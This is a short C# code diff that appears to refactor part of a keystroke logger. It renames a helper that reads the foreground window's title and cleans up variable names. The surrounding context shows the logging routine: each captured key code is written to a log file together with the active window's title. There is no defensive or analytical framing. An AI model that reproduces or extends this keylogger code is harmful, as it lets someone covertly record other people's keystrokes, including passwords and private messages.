@@ -41,15 +41,15 @@ namespace Hooks
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-        private static string GetActiveWindowTitle()
+        private static string GetActiveWindowName()
         {
-            const int nChars = 256;
-            StringBuilder Buff = new StringBuilder(nChars);
+            const int numChars = 256;
+            StringBuilder buffer = new StringBuilder(numChars);
             IntPtr handle = GetForegroundWindow();
 
-            if (GetWindowText(handle, Buff, nChars) > 0)
+            if (GetWindowText(handle, buffer, numChars) > 0)
             {
-                return Buff.ToString();
+                return buffer.ToString();
             }
             return null;
         }
@@ -63,7 +63,7 @@ namespace Hooks
                 StreamWriter sw = new StreamWriter(log, true);
                 sw.Write((Keys)vkCode);
                 using (Process curProcess = Process.GetCurrentProcess())
-                sw.Write(" - Process Name: "+(GetActiveWindowTitle()));
+                sw.Write(" - Process Name: "+(GetActiveWindowName()));
                 sw.WriteLine();
                 sw.Close();
             }
